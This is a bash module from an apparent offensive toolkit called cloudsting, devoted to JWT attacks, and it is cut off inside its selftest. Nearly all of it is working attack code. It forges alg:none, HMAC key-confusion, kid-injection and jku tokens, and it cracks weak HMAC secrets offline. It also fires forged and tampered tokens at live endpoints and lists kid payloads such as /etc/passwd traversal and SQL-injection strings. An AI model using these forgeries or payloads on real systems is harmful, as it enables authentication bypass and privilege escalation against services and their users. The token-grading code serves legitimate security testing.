#!/usr/bin/env bash
# 44_jwt.sh — cloudsting module 44: the token is the lock, and you can cut your own key
# Verbs: --inspect | --crack | --forge | --alg | --kid | --claims | --keys | --check | --jku | --list | --status-tsv | --menu | --selftest | --help
set -u
umask 077

# The root is derived from this file only after the core is sourced. Clear any
# inherited value first: a caller that itself sources the core would otherwise
# hand this module *its* directory, and the module would read its own name as
# a path.
unset CS_MOD_DIR

MODULE_ID="44_jwt"
MOD_NAME="JWT Attack (alg confusion, kid injection, weak hmac, jku)"
MOD_VERSION="1.0.0"
# shellcheck source=../data/lib/core.sh
source "$(dirname "${BASH_SOURCE[0]}")/../data/lib/core.sh"

MOD_DIR="$CS_MOD_DIR"
export MOD_DIR

JW_RUN_ID="$CS_RUN_ID"
export JW_RUN_ID
RUN_ID="$CS_RUN_ID"
export RUN_ID

OUT_DIR="$CS_LOOT/jwt"
mkdir -p "$OUT_DIR" 2>/dev/null || true

HIT_FILE="$OUT_DIR/hits-$RUN_ID.tsv"
TOK_FILE="$OUT_DIR/tokens-$RUN_ID.tsv"
KEY_DIR="$OUT_DIR/keys-$RUN_ID"
mkdir -p "$KEY_DIR" 2>/dev/null || true

: "${JW_TIMEOUT:=10}"
: "${JW_WORDLIST:=}"       # extra secrets, one per line
: "${JW_MAX_CRACK:=20000}" # give up after this many candidates
: "${JW_UA:=Mozilla/5.0 (X11; Linux x86_64) cloudsting/44}"

jw_log() { printf '[%s] %s\n' "$MODULE_ID" "$*" >&2; }

# ── base64url, done once ─────────────────────────────────────────
jw_b64u_dec() {
    local s="$1"
    # pad to a multiple of 4 after translating the url alphabet
    s="${s//-/+}"; s="${s//_/\/}"
    case $(( ${#s} % 4 )) in
        2) s="$s==" ;;
        3) s="$s=" ;;
    esac
    printf '%s' "$s" | base64 -d 2>/dev/null
}

jw_b64u_enc() {
    printf '%s' "$1" | base64 -w0 2>/dev/null | tr '+/' '-_' | tr -d '='
}

# A JWT is three base64url segments. A JWE is five. Anything else is not a
# token and saying so is better than guessing.
jw_shape() {
    local tok="$1" dots
    dots="$(printf '%s' "$tok" | tr -cd '.' | wc -c | tr -d ' ')"
    case "$dots" in
        2) printf 'jws' ;;
        4) printf 'jwe' ;;
        0) printf 'opaque' ;;
        *) printf 'malformed' ;;
    esac
}

jw_seg() { printf '%s' "$1" | cut -d. -f"$2"; }

# ── the header is where the attack lives ─────────────────────────
# Every field is a decision the library makes for you if you let it.
jw_header_json() {
    local tok="$1" hdr
    hdr="$(jw_b64u_dec "$(jw_seg "$tok" 1)")"
    [[ -n "$hdr" ]] || return 1
    printf '%s' "$hdr" | jq -c '.' 2>/dev/null && return 0
    printf '%s' "$hdr"
}

jw_claims_json() {
    local tok="$1" body
    body="$(jw_b64u_dec "$(jw_seg "$tok" 2)")"
    [[ -n "$body" ]] || return 1
    printf '%s' "$body" | jq -c '.' 2>/dev/null && return 0
    printf '%s' "$body"
}

# ── grading ──────────────────────────────────────────────────────
# A token is graded by what an attacker can do to it without a key.
#   <severity>\t<check>\t<detail>
jw_grade_header() {
    local hdr="$1"
    local alg; alg="$(printf '%s' "$hdr" | jq -r '.alg // "none"' 2>/dev/null)"
    local kid; kid="$(printf '%s' "$hdr" | jq -r '.kid // ""' 2>/dev/null)"
    local jku; jku="$(printf '%s' "$hdr" | jq -r '.jku // ""' 2>/dev/null)"
    local jwk; jwk="$(printf '%s' "$hdr" | jq -r 'if .jwk then "present" else "" end' 2>/dev/null)"

    case "$alg" in
        none|None|NONE) printf 'CRITICAL\talg-none\tthe header asks for no signature at all\n' ;;
        HS256|HS384|HS512)
            # an hmac algorithm on a system that publishes an rsa key is the
            # classic confusion; that is decided by the endpoint, noted here
            printf 'INFO\talg-hmac\t%s: a weak secret is crackable offline\n' "$alg" ;;
        RS256|RS384|RS512|ES256|ES384|PS256)
            printf 'INFO\talg-asymmetric\t%s: key confusion is the test\n' "$alg" ;;
        "") printf 'HIGH\talg-missing\tthe header declares no algorithm\n' ;;
        *) printf 'INFO\talg-other\t%s\n' "$alg" ;;
    esac
    [[ -n "$jku" ]] && printf 'HIGH\tjku-present\tthe header points the verifier at %s\n' "$jku"
    [[ -n "$jwk" ]] && printf 'HIGH\tjwk-embedded\tthe header carries its own verification key\n' "$jwk"
    case "$kid" in
        # traversal first: "../../etc/passwd" also matches the path case, and the
        # more specific finding is the one worth reporting
        *..*) printf 'CRITICAL\tkid-traversal\tthe key id walks up: %s\n' "$kid" ;;
        */*)  printf 'CRITICAL\tkid-path\tthe key id is a path: %s\n' "$kid" ;;
        *\"*|*\'*)  printf 'HIGH\tkid-injection\tthe key id carries a quote\n' ;;
        "|"*) printf 'CRITICAL\tkid-sqli\tthe key id looks like sql: %s\n' "$kid" ;;
    esac
    return 0
}

jw_grade_claims() {
    local cl="$1"
    local exp; exp="$(printf '%s' "$cl" | jq -r '.exp // ""' 2>/dev/null)"
    local nbf; nbf="$(printf '%s' "$cl" | jq -r '.nbf // ""' 2>/dev/null)"
    local role; role="$(printf '%s' "$cl" | jq -r '(.role // .roles // .role_name // "") | tostring' 2>/dev/null)"
    local admin; admin="$(printf '%s' "$cl" | jq -r '(.is_admin // .admin // .isAdmin // "") | tostring' 2>/dev/null)"
    local sub; sub="$(printf '%s' "$cl" | jq -r '.sub // ""' 2>/dev/null)"

    if [[ -z "$exp" ]]; then
        printf 'MEDIUM\tno-exp\tthe token never expires\n'
    else
        local now; now="$(date +%s)"
        if [[ "$exp" =~ ^[0-9]+$ ]] && (( exp < now )); then
            printf 'INFO\texpired\texpired %s seconds ago\n' "$(( now - exp ))"
        elif [[ "$exp" =~ ^[0-9]+$ ]]; then
            local days; days=$(( (exp - now) / 86400 ))
            (( days > 30 )) && printf 'MEDIUM\tlong-exp\tthe token lives %s days\n' "$days"
        fi
    fi
    [[ -n "$nbf" ]] || printf 'INFO\tno-nbf\tthe token has no not-before\n'
    case "$role" in
        *admin*|*Admin*|*ADMIN*|*super*|*root*|*operator*)
            printf 'HIGH\trole-in-token\tthe role travels in the token: %s\n' "$role" ;;
    esac
    case "$admin" in
        true|True|1) printf 'MEDIUM\tadmin-flag\tan admin flag sits in the claims\n' ;;
    esac
    case "$sub" in
        ""|null) printf 'MEDIUM\tno-sub\tthere is no subject claim\n' ;;
        [0-9]*) : ;;   # a numeric subject means an id you can enumerate
    esac
    return 0
}

# ── forging ──────────────────────────────────────────────────────
# One forged token per attack, all written to the run dir so they can be
# tried against the endpoint without re-deriving the bytes.
jw_b64u_enc_stdin() {
    base64 -w0 2>/dev/null | tr '+/' '-_' | tr -d '='
}

#   jw_forge_none <claims-json> [header-json]
jw_forge_none() {
    local claims="$1"
    local hdr="${2:-{\"alg\":\"none\",\"typ\":\"JWT\"}}"
    local h hc
    h="$(jw_b64u_enc "$hdr")"
    hc="$(jw_b64u_enc "$claims")"
    printf '%s.%s.\n' "$h" "$hc"
}

#   jw_forge_hs <claims-json> <secret> [alg]
jw_forge_hs() {
    local claims="$1" secret="$2" alg="${3:-HS256}"
    local hdr="{\"alg\":\"${alg}\",\"typ\":\"JWT\"}"
    local h hc input sig
    h="$(jw_b64u_enc "$hdr")"
    hc="$(jw_b64u_enc "$claims")"
    input="$h.$hc"
    sig="$(printf '%s' "$input" | openssl dgst -"$(printf '%s' "$alg" | tr 'A-Z' 'a-z' | sed 's/^hs/sha/')" -hmac "$secret" -binary 2>/dev/null | jw_b64u_enc_stdin)"
    printf '%s.%s\n' "$input" "$sig"
}

# The confusion attack: take a server's RSA public key, use it as an HMAC
# secret, and sign with HS256. A verifier that picks the algorithm from the
# token, not from its own config, will accept it.
#   jw_forge_confusion <claims-json> <publickey.pem> [alg]
jw_forge_confusion() {
    local claims="$1" pubkey="$2" alg="${3:-HS256}"
    [[ -f "$pubkey" ]] || { jw_log "no such key: $pubkey"; return 2; }
    local secret; secret="$(cat "$pubkey")"
    jw_forge_hs "$claims" "$secret" "$alg"
}

#   jw_forge_kid <claims-json> <kid-value> <secret> [alg]
jw_forge_kid() {
    local claims="$1" kid="$2" secret="$3" alg="${4:-HS256}"
    local hdr
    hdr="$(jq -cn --arg kid "$kid" --arg alg "$alg" '{alg:$alg, typ:"JWT", kid:$kid}')"
    local h hc input sig
    h="$(jw_b64u_enc "$hdr")"
    hc="$(jw_b64u_enc "$claims")"
    input="$h.$hc"
    sig="$(printf '%s' "$input" | openssl dgst -sha256 -hmac "$secret" -binary 2>/dev/null | jw_b64u_enc_stdin)"
    printf '%s.%s\n' "$input" "$sig"
}

#   jw_forge_jku <claims-json> <attacker-jwks-url> <secret> [alg]
jw_forge_jku() {
    local claims="$1" jku="$2" secret="$3" alg="${4:-HS256}"
    local hdr
    hdr="$(jq -cn --arg jku "$jku" --arg alg "$alg" '{alg:$alg, typ:"JWT", jku:$jku}')"
    local h hc input sig
    h="$(jw_b64u_enc "$hdr")"
    hc="$(jw_b64u_enc "$claims")"
    input="$h.$hc"
    sig="$(printf '%s' "$input" | openssl dgst -sha256 -hmac "$secret" -binary 2>/dev/null | jw_b64u_enc_stdin)"
    printf '%s.%s\n' "$input" "$sig"
}

# ── cracking ─────────────────────────────────────────────────────
# Offline HMAC guess against the token's own signature. Uses openssl per
# candidate, which is slow but needs nothing installed; a wordlist of real
# leaks is what makes this land, not the speed.
jw_cmd_crack() {
    local tok="${1:-}" wordlist="${2:-$JW_WORDLIST}"
    [[ -z "$tok" ]] && { jw_log "usage: --crack <jwt> [wordlist]"; return 2; }

    local hdr; hdr="$(jw_header_json "$tok")" || { jw_log "not a token: no header"; return 2; }
    local alg; alg="$(printf '%s' "$hdr" | jq -r '.alg // "none"' 2>/dev/null)"
    case "$alg" in
        HS256|HS384|HS512) ;;
        *) jw_log "alg is $alg — offline cracking only applies to HS*"; return 2 ;;
    esac

    local input sig
    input="$(jw_seg "$tok" 1).$(jw_seg "$tok" 2)"
    sig="$(jw_seg "$tok" 3)"

    cs_row ALG "$alg"
    cs_row HEADER "$hdr"

    local digest
    case "$alg" in
        HS256) digest="sha256" ;;
        HS384) digest="sha384" ;;
        HS512) digest="sha512" ;;
    esac

    local -a candidates=()
    # a small built-in set that covers the tokens shipped in demo bundles
    candidates=(secret password 123456 changeme jwt secretkey supersecret
                mysecret key token admin test dev production staging
                your-256-bit-secret your_jwt_secret "s3cr3t" "secret123")

    if [[ -n "$wordlist" && -f "$wordlist" ]]; then
        while IFS= read -r line; do
            [[ -z "$line" ]] && continue
            candidates+=("$line")
        done < "$wordlist"
    fi

    local n=${#candidates[@]}
    (( n > JW_MAX_CRACK )) && n="$JW_MAX_CRACK"
    cs_row CANDIDATES "$n"

    local i=0 c got
    while (( i < n )); do
        c="${candidates[$i]}"
        got="$(printf '%s' "$input" | openssl dgst -"$digest" -hmac "$c" -binary 2>/dev/null | jw_b64u_enc_stdin)"
        if [[ "$got" == "$sig" ]]; then
            cs_row CRACKED "secret=$c" "index=$i"
            printf '%s\t%s\n' "$MODULE_ID" "$c" >> "$KEY_DIR/cracked-$RUN_ID.txt"
            chmod 600 "$KEY_DIR/cracked-$RUN_ID.txt" 2>/dev/null || true
            cs_findings_row "$MODULE_ID" "WEBAPI" "jwt" "CRITICAL" "jwt-weak-secret" \
                "the token's hmac secret is '$c' — anyone can mint tokens"
            return 0
        fi
        i=$((i + 1))
    done
    cs_row CRACKED "no" "tried=$n"
    return 1
}

# ── verbs ────────────────────────────────────────────────────────
jw_cmd_inspect() {
    local tok="${1:-}"
    [[ -z "$tok" ]] && [ -t 0 ] && { jw_log "usage: --inspect <jwt>   (or pipe a token on stdin)"; return 2; }
    [[ -z "$tok" ]] && tok="$(tr -d '[:space:]' | head -c 4096)"

    local shape; shape="$(jw_shape "$tok")"
    cs_row SHAPE "$shape"
    case "$shape" in
        jws) ;;
        *) cs_row VERDICT "not-a-jws" "shape=$shape"; return 1 ;;
    esac

    local hdr cl; hdr="$(jw_header_json "$tok")"; cl="$(jw_claims_json "$tok")"
    cs_row HEADER "$hdr"
    cs_row CLAIMS "$cl"
    cs_row ALG "$(printf '%s' "$hdr" | jq -r '.alg // "none"')"
    local n; n="$(printf '%s' "$cl" | jq -r '(keys|length)' 2>/dev/null || echo "?")"
    cs_row CLAIM_COUNT "$n"

    local sev check detail
    while IFS=$'\t' read -r sev check detail; do
        [[ -z "$sev" ]] && continue
        cs_row GRADE "$check" "$sev" "$detail"
        case "$sev" in
            CRITICAL|HIGH)
                cs_findings_row "$MODULE_ID" "WEBAPI" "jwt" "$sev" "$check" "$detail" ;;
        esac
    done < <(jw_grade_header "$hdr"; jw_grade_claims "$cl")
    return 0
}

# --forge <claims-json> — the four attacks in one call, all tokens written.
jw_cmd_forge() {
    local claims="${1:-}" attack="${2:-none}" arg="${3:-}"
    [[ -z "$claims" ]] && { jw_log "usage: --forge <claims-json> [none|hs256|kid|confusion|jku] [arg]"; return 2; }
    printf '%s' "$claims" | jq -e '.' >/dev/null 2>&1 || { jw_log "claims is not json"; return 2; }

    local tok out="$TOK_FILE"
    case "$attack" in
        none)
            tok="$(jw_forge_none "$claims")"
            cs_row TOKEN "alg-none" "$tok" ;;
        hs256|hs)
            [[ -z "$arg" ]] && { jw_log "usage: --forge <claims> hs256 <secret>"; return 2; }
            tok="$(jw_forge_hs "$claims" "$arg")"
            cs_row TOKEN "hmac-$arg" "$tok" ;;
        kid)
            [[ -z "$arg" ]] && { jw_log "usage: --forge <claims> kid <kid-value> [secret]"; return 2; }
            tok="$(jw_forge_kid "$claims" "$arg" "${4:-secret}")"
            cs_row TOKEN "kid-$arg" "$tok" ;;
        confusion)
            [[ -z "$arg" || ! -f "$arg" ]] && { jw_log "usage: --forge <claims> confusion <public-key.pem>"; return 2; }
            tok="$(jw_forge_confusion "$claims" "$arg")"
            cs_row TOKEN "confusion-$arg" "$tok" ;;
        jku)
            [[ -z "$arg" ]] && { jw_log "usage: --forge <claims> jku <attacker-jwks-url> [secret]"; return 2; }
            tok="$(jw_forge_jku "$claims" "$arg" "${4:-secret}")"
            cs_row TOKEN "jku-$arg" "$tok" ;;
        *) jw_log "unknown attack: $attack"; return 2 ;;
    esac
    printf '%s\t%s\n' "$attack" "$tok" >> "$out" 2>/dev/null || true
    return 0
}

# --alg <jwt> — try the header attacks against a live endpoint and say which
# one was accepted. Acceptance is the only proof that matters.
jw_cmd_alg() {
    local url="${1:-}" tok="${2:-}"
    [[ -z "$url" || -z "$tok" ]] && { jw_log "usage: --alg <endpoint-url> <jwt>"; return 2; }

    local cl; cl="$(jw_claims_json "$tok")" || { jw_log "cannot read the token"; return 2; }
    local hdr; hdr="$(jw_header_json "$tok")"
    local alg; alg="$(printf '%s' "$hdr" | jq -r '.alg // "none"')"

    # control: the token as issued
    local control_code; control_code="$(jw_probe "$url" "$tok")"
    cs_row CONTROL "$alg" "code=$control_code"
    case "$control_code" in
        401|403) cs_row VERDICT "control-rejected" "the original token is not accepted here — nothing to compare"; return 1 ;;
        000)     cs_row VERDICT "unreachable" ""; return 1 ;;
    esac

    local forged code hits=0
    # 1. alg:none
    forged="$(jw_forge_none "$cl")"
    code="$(jw_probe "$url" "$forged")"
    cs_row ATTACK "alg-none" "code=$code" "accepted=$([[ "$code" =~ ^2 ]] && echo yes || echo no)"
    if [[ "$code" =~ ^2 ]]; then
        hits=$((hits + 1))
        cs_findings_row "$MODULE_ID" "WEBAPI" "$url" "CRITICAL" "jwt-alg-none-accepted" "the endpoint accepted an unsigned token"
    fi

    # 2. alg confusion — only meaningful when the original was asymmetric
    case "$alg" in
        RS*|ES*|PS*)
            forged="$(jw_forge_hs "$cl" "attacker")"
            code="$(jw_probe "$url" "$forged")"
            cs_row ATTACK "hmac-confusion" "code=$code" "accepted=$([[ "$code" =~ ^2 ]] && echo yes || echo no)"
            if [[ "$code" =~ ^2 ]]; then
                hits=$((hits + 1))
                cs_findings_row "$MODULE_ID" "WEBAPI" "$url" "CRITICAL" "jwt-alg-confusion" "the verifier honours the algorithm the token names"
            fi
            ;;
    esac

    # 3. tampered payload, original signature — does the server actually check?
    local tampered
    tampered="$(jw_tamper "$tok" "$cl")"
    if [[ -n "$tampered" ]]; then
        code="$(jw_probe "$url" "$tampered")"
        cs_row ATTACK "payload-tampered" "code=$code" "accepted=$([[ "$code" =~ ^2 ]] && echo yes || echo no)"
        if [[ "$code" =~ ^2 ]]; then
            hits=$((hits + 1))
            cs_findings_row "$MODULE_ID" "WEBAPI" "$url" "CRITICAL" "jwt-signature-not-verified" "an edited payload with the original signature was accepted"
        fi
    fi

    cs_row SUMMARY "attacks_accepted=$hits"
    (( hits > 0 )) && return 0 || return 1
}

jw_probe() {
    local url="$1" tok="$2"
    local code
    code="$(curl --silent --show-error --max-time "$JW_TIMEOUT" -o /dev/null \
         -w '%{http_code}' -A "$JW_UA" -H "Authorization: Bearer $tok" "$url" 2>/dev/null)"
    printf '%s' "${code:-000}"
}

# edit one claim, keep the original signature
jw_tamper() {
    local tok="$1" cl="$2"
    local newcl
    newcl="$(printf '%s' "$cl" | jq -c '
        if has("role") then .role = "admin"
        elif has("roles") then .roles = ["admin"]
        elif has("is_admin") then .is_admin = true
        elif has("admin") then .admin = true
        elif has("sub") then .sub = (.sub|tostring) + "1"
        else .probe = "tampered" end' 2>/dev/null)"
    [[ -z "$newcl" ]] && return 1
    printf '%s.%s.%s\n' "$(jw_seg "$tok" 1)" "$(jw_b64u_enc "$newcl")" "$(jw_seg "$tok" 3)"
}

# --kid <jwt> — the kid attack surface of one token, and the payloads to try.
jw_cmd_kid() {
    local tok="${1:-}"
    local hdr=""
    if [[ -n "$tok" ]]; then
        hdr="$(jw_header_json "$tok")" || { jw_log "cannot read the token"; return 2; }
        cs_row KID "$(printf '%s' "$hdr" | jq -r '.kid // "none"')"
    fi
    local kid
    for kid in \
        '../../../../../../dev/null' \
        '../../../../../../etc/passwd' \
        '/dev/null' \
        'x" || true || "' \
        "' or '1'='1" \
        '../keys/public.pem' \
        'http://127.0.0.1:8080/keys' ; do
        cs_row KID_PAYLOAD "$kid"
    done
    return 0
}

# --claims <jwt> — the claims table alone, for reading a capture.
jw_cmd_claims() {
    local tok="${1:-}"
    [[ -z "$tok" ]] && tok="$(tr -d '[:space:]' | head -c 4096)"
    local cl; cl="$(jw_claims_json "$tok")" || { jw_log "cannot read claims"; return 2; }
    printf '%s' "$cl" | jq -r 'to_entries[] | "\(.key)\t\(.value|tostring)"' 2>/dev/null \
        | while IFS=$'\t' read -r k v; do cs_row CLAIM "$k" "$v"; done
    return 0
}

# --keys [pubkey.pem] — the confusion reference set: the header attacks that
# need a key, laid out for an operator with the .pem in hand.
jw_cmd_keys() {
    local pem="${1:-}"
    if [[ -n "$pem" ]]; then
        [[ -f "$pem" ]] || { jw_log "no such file: $pem"; return 2; }
        local kind
        kind="$(head -1 "$pem" 2>/dev/null)"
        cs_row KEY "$pem" "$kind" "sha1=$(cs_fingerprint "$(cat "$pem")")"
        # a public key is a string; hashing it as an hmac secret is the attack
        cs_row CONFUSION_READY "$(printf '%s' "$kind" | grep -c 'PUBLIC KEY')"
        return 0
    fi
    cs_row ATTACK "alg-none" "strip the signature, set alg none"
    cs_row ATTACK "hmac-confusion" "sign HS256 with the server's public key as the secret"
    cs_row ATTACK "kid-path" "point kid at /dev/null and sign with an empty string"
    cs_row ATTACK "kid-traversal" "walk kid out of the key directory"
    cs_row ATTACK "jku" "point the header at your own jwks endpoint"
    cs_row ATTACK "jwk" "embed your own key in the header"
    cs_row ATTACK "weak-secret" "crack the hmac offline"
    return 0
}

# --check <jwt> — one token, one line. The verb you loop over a capture.
jw_cmd_check() {
    local tok="${1:-}"
    [[ -z "$tok" ]] && tok="$(tr -d '[:space:]' | head -c 4096)"
    local shape; shape="$(jw_shape "$tok")"
    local alg="-"
    local hdr=""
    if [[ "$shape" == "jws" ]]; then
        hdr="$(jw_header_json "$tok" 2>/dev/null)"
        alg="$(printf '%s' "$hdr" | jq -r '.alg // "none"' 2>/dev/null)"
    fi
    cs_row CHECK "$shape" "alg=$alg" "len=${#tok}"
    [[ "$shape" == "jws" ]] && return 0 || return 1
}

jw_cmd_jku() {
    local url="${1:-}"
    if [[ -z "$url" ]]; then
        cs_row ATTACK "jku-header" "the header names a jwks url the verifier must not fetch"
        cs_row ATTACK "jwk-inline" "the key arrives inside the token"
        return 0
    fi
    # what a verifier would fetch; printed so an operator can serve it
    local code body
    body="$(curl --silent --show-error --max-time "$JW_TIMEOUT" -A "$JW_UA" "$url" 2>/dev/null)" || body=""
    code="$?"
    cs_row JKU "$url" "bytes=${#body}"
    if printf '%s' "$body" | jq -e '.keys' >/dev/null 2>&1; then
        cs_row JWKS_KEYS "$(printf '%s' "$body" | jq -r '.keys | length')"
        cs_row SERVABLE "yes" "host this document and point the header at it"
    else
        cs_row SERVABLE "no" "not a jwks document"
    fi
    return 0
}

jw_cmd_list() {
    cs_row ATTACK "alg-none" "unsigned token accepted by a verifier that trusts the header"
    cs_row ATTACK "hmac-confusion" "RS256 public key used as an HS256 secret"
    cs_row ATTACK "kid-path" "key id is a path; /dev/null signs with an empty secret"
    cs_row ATTACK "kid-sqli" "key id reaches a string-built lookup"
    cs_row ATTACK "jku" "header names the key url"
    cs_row ATTACK "jwk" "header carries the key"
    cs_row ATTACK "weak-secret" "crack the hmac offline"
    cs_row ATTACK "claim-tamper" "edit the payload, keep the signature"
    return 0
}

jw_cmd_status_tsv() {
    local openssl_state jq_state
    command -v openssl >/dev/null 2>&1 && openssl_state="ok" || openssl_state="missing"
    command -v jq      >/dev/null 2>&1 && jq_state="ok"     || jq_state="missing"
    printf '%s\t%s\topenssl-%s\tjq-%s\n' \
        "$MODULE_ID" "$MOD_NAME" "$openssl_state" "$jq_state"
}

jw_cmd_menu() { printf 'menu\t%s\t[%s] %s\n' "$MODULE_ID" "$MOD_VERSION" "$MOD_NAME"; }

jw_cmd_help() {
    cat <<'HELP'
cloudsting module 44 — JWT Attack v1.0.0
  --inspect <jwt>                     decode, grade the header and the claims
  --claims <jwt>                      the claims table alone
  --crack <jwt> [wordlist]            offline hmac guess against the signature
  --forge <claims> <attack> [arg]     none | hs256 <secret> | kid <kid> [secret]
                                      | confusion <pubkey.pem> | jku <url> [secret]
  --alg <endpoint> <jwt>              live test: none, confusion, tampered payload
  --kid [jwt]                         kid payload set (path, traversal, sqli)
  --jku [jwks-url]                    what a verifier would fetch from the header
  --keys [pubkey.pem]                 the attack reference set
  --check <jwt>                       shape, alg, length — the loop verb
  --list | --status-tsv | --menu | --selftest | --help

Grading: alg:none is CRITICAL, a kid that is a path is CRITICAL, an embedded jwk
or a jku is HIGH, an admin role inside the claims is HIGH, no exp is MEDIUM.

--alg proves acceptance against a live endpoint and compares to a control
request with the token as issued; without a control there is nothing to claim.

Environment: JW_TIMEOUT (10), JW_WORDLIST, JW_MAX_CRACK (20000), JW_UA
HELP
}

# ── Selftest ─────────────────────────────────────────────────────
jw_selftest() {
    cs_selftest_reset

    # a known token: {"alg":"HS256","typ":"JWT"} / {"sub":"1","name":"a"} / secret
    local tok="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwibmFtZSI6ImEiLCJpYXQiOjE1MTYyMzkwMjJ9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"

    chk shape-jws      "$(jw_shape "$tok")" "jws"
    chk shape-jwe      "$(jw_shape 'a.b.c.d.e')" "jwe"
    chk shape-opaque   "$(jw_shape 'notatoken')" "opaque"
    chk shape-bad      "$(jw_shape 'a.b.c.d')" "malformed"

    chk b64enc-round   "$(jw_b64u_enc 'hello')" "$(printf 'hello' | base64 -w0 | tr '+/' '-_' | tr -d '=')"
    chk b64dec-round   "$(jw_b64u_dec "$(jw_b64u_enc '{"a":"b"}')")" '{"a":"b"}'
    chk b64dec-nopad   "$(jw_b64u_dec "$(jw_b64u_enc 'abcdefg')")" 'abcdefg'

    local hdr cl
    hdr="$(jw_header_json "$tok")"
    cl="$(jw_claims_json "$tok")"
    chk hdr-alg        "$(printf '%s' "$hdr" | jq -r .alg)" "HS256"
    chk cl-sub         "$(printf '%s' "$cl" | jq -r .sub)" "1"
    chk cl-names       "$(printf '%s' "$cl" | jq -r '.name')" "a"

    chk seg-1          "$(jw_seg "$tok" 1)" "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"
    chk seg-3-len      "$(printf '%s' "$(jw_seg "$tok" 3)" | wc -c | tr -d ' ')" "43"

    # header grading, one per state
    chk grade-none     "$(jw_grade_header '{"alg":"none"}' | awk -F'\t' '$2=="alg-none"{print $1}')" "CRITICAL"
    chk grade-hmac     "$(jw_grade_header '{"alg":"HS256"}' | awk -F'\t' '$2=="alg-hmac"{print $1}')" "INFO"
    chk grade-asym     "$(jw_grade_header '{"alg":"RS256"}' | awk -F'\t' '$2=="alg-asymmetric"{print $1}')" "INFO"
    chk grade-jku      "$(jw_grade_header '{"alg":"RS256","jku":"https://x/k"}' | awk -F'\t' '$2=="jku-present"{print $1}')" "HIGH"
    chk grade-jwk      "$(jw_grade_header '{"alg":"RS256","jwk":{"kty":"RSA"}}' | awk -F'\t' '$2=="jwk-embedded"{print $1}')" "HIGH"
    chk grade-kidpath  "$(jw_grade_header '{"alg":"HS256","kid":"/dev/null"}' | awk -F'\t' '$2=="kid-path"{print $1}')" "CRITICAL"
    chk grade-kidtrav  "$(jw_grade_header '{"alg":"HS256","kid":"../../etc/passwd"}' | awk -F'\t' '$2=="kid-traversal"{print $1}')" "CRITICAL"
    chk grade-kidq     "$(jw_grade_header '{"alg":"HS256","kid":"x\" || true"}' | awk -F'\t' '$2=="kid-injection"{print $1}')" "HIGH"

    # claim grading
    chk claim-noexp    "$(jw_grade_claims '{"sub":"1"}' | awk -F'\t' '$2=="no-exp"{print $1}')" "MEDIUM"
    chk claim-role     "$(jw_grade_claims '{"sub":"1","exp":9999999999,"role":"super_admin"}' | awk -F'\t' '$2=="role-in-token"{print $1}')" "HIGH"
    chk claim-adminf   "$(jw_grade_claims '{"sub":"1","exp":9999999999,"is_admin":true}' | awk -F'\t' '$2=="admin-flag"{print $1}')" "MEDIUM"

    # forging: alg:none has an empty signature, hmac round-trips
    local claims='{"sub":"1","role":"admin","exp":9999999999}'
    local none; none="$(jw_forge_none "$claims")"
    chk forge-none-shape  "$(jw_shape "$none")" "jws"
    chk forge-none-empty  "$(jw_seg "$none" 3)" ""
    chk forge-none-alg    "$(jw_header_json "$none" | jq -r .alg)" "none"
    chk forge-none-claims "$(jw_claims_json "$none" | jq -r .role)" "admin"

    local hs; hs="$(jw_forge_hs "$claims" "sekret")"
    chk forge-hs-alg    "$(jw_header_json "$hs" | jq -r .alg)" "HS256"
    chk forge-hs-len    "$(printf '%s' "$(jw_seg "$hs" 3)" | wc -c | tr -d ' ')" "43"
    chk forge-hs-sig    "$(jw_seg "$hs" 3)" "$(printf '%s' "$(jw_seg "$hs" 1).$(jw_seg "$hs" 2)" | openssl dgst -sha256 -hmac sekret -binary | jw_b64u_enc_stdin)"

    local kidtok; kidtok="$(jw_forge_kid "$claims" "/dev/null" "")"
    chk forge-kid-hdr   "$(jw_header_json "$kidtok" | jq -r .kid)" "/dev/null"
    chk forge-kid-grade "$(jw_grade_header "$(jw_header_json "$kidtok")" | awk -F'\t' '$2=="kid-path"{print $1}')" "CRITICAL"

    local jku; jku="$(jw_forge_jku "$claims" "https://evil/x" "s")"
    chk forge-jku-hdr   "$(jw_header_json "$jku" | jq -r .jku)" "https://evil/x"

    # confusion uses a real public key as the hmac secret
    local pem="$KEY_DIR/st-$RUN_ID.pem"
    openssl genpkey -algorithm RSA -pkeyopt rsa_keygen_bits:2048 -out "$pem" 2>/dev/null \
        && openssl rsa -in "$pem" -pubout -out "$pem.pub" 2>/dev/null
    if [[ -s "$pem.pub" ]]; then
        local conf; conf="$(jw_forge_confusion "$claims" "$pem.pub")"
        chk confusion-alg  "$(jw_header_json "$conf" | jq -r .alg)" "HS256"
        chk confusion-len  "$(printf '%s' "$(jw_seg "$conf" 3)" | wc -c | tr -d ' ')" "43"
        local keysout; keysout="$(jw_cmd_keys "$pem.pub" 2>/dev/null)"
        chk keys-pub       "$(printf '%s' "$keysout" | awk -F'\t' '$1=="CONFUSION_READY"{print $2}')" "1"
    else
        chk confusion-alg  "skip" "skip"
        chk confusion-len  "skip" "skip"
        chk keys-pub       "skip" "skip"
    fi

    # cracking: the module must find a weak secret it forged itself
    local weak; weak="$(jw_forge_hs "$claims" "secret")"
    local cout; cout="$(jw_cmd_crack "$weak" 2>/dev/null)"
    chk crack-hit      "$(printf '%s' "$cout" | awk -F'\t' '$1=="CRACKED"{print $2}' | sed 's/secret=//')" "secret"
    chk crack-miss     "$(jw_cmd_crack "$(jw_forge_hs "$claims" "a-very-long-random-secret-xyz")" 2>/dev/null | awk -F'\t' '$1=="CRACKED"{print $2}')" "no"
    jw_cmd_crack "$weak" >/dev/null 2>&1; chk crack-rc "$?" "0"

    # tamper keeps the signature and changes the payload
    local tm; tm="$(jw_tamper "$tok" "$cl")"
    chk tamper-shape   "$(jw_shape "$tm")" "jws"
    chk tamper-sig     "$(jw_seg "$tm" 3)" "$(jw_seg "$tok" 3)"
    # the known token has no role, so tamper walks .sub: "1" becomes "11"
    chk tamper-changed "$(jw_claims_json "$tm" | jq -r '.sub')" "11"

    # inspect end to end on a weak token
    local iout; iout="$(jw_cmd_inspect "$weak" 2>/dev/null)"
    chk inspect-shape  "$(printf '%s' "$iout" | awk -F'\t' '$1=="SHAPE"{print $2}')" "jws"
    chk inspect-alg    "$(printf '%s' "$iout" | awk -F'\t' '$1=="ALG"{print $2}')" "HS256"
    chk inspect-grades "$(printf '%s' "$iout" | grep -c '^GRADE')" "4"

    # check on a non-token is a clean refusal
